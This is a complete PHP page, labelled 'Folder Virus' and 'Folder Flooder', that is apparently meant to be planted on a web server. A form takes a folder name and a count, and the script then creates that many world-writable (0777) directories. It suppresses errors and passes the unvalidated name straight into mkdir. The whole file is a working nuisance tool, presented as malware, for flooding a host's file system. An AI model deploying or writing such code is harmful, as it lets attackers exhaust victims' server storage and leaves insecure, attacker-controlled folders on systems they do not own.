<html><head>
<title>Folder Virus</title>
<meta name="viewport" content="width=device-width">
<style>
input[type=text] {
width: 50%;
padding: 12px 20px;
margin: 8px 0;
box-sizing: border-box;
border: 2px solid #33FF00;
}
input[type=number] {
width: 30%;
padding: 12px 20px;
margin: 8px 0;
box-sizing: border-box;
border: 2px solid #33FF00;
}
input[type=text]:focus {
border: 3px solid red;
}
input[type=number]:focus {
border: 3px solid red;
}
input[type=submit],input[type=button],input[type=reset] {
background-color: black;
border: 2px solid #33FF00;
color: #33FF00;
padding: 16px 32px;
text-decoration: none;
margin: 4px 2px;
cursor: pointer;
}
#success{
color:#33FF00;
font-size:17px;
align:center;
}
#failed{
color:red;
font-size:17px;
align:center;
}
</style>
</head>
<body style="background-color:black">
<?php
error_reporting("0");
$dest = $_SERVER["PHP_SELF"];
echo ('
<center>
<h2 style="color:#33FF00">Folder Flooder</h2><br><form method="post" action="">
<input type="text" name="dirname" placeholder="Folder Name">
<input type="number" name="amount" placeholder="Amount"><br><br>
<input type="submit" name="submit" value="Flood">
</form>
</center>
');
$amount = $_POST["amount"];
$name = $_POST["dirname"];
if($_SERVER["REQUEST_METHOD"] == "POST"){
for($x = 0; $x < $amount; $x++) {
$n = 0;
while($n < $amount){
$n++;
$dirname = $name . "-" . $n;
mkdir($dirname, 0777);
}
} 
echo "<code id=success>" . $amount . " folders created successfully" . "</code>" . "<br>";
$x = 0;
while($x < $amount){
$x++;
echo "<code id=success>" . "[NAME:" . $name . "-" . $x . "]" . " [PERMISSION:777]" . "</code>" . "<br>";
}
}
?>
</body></html>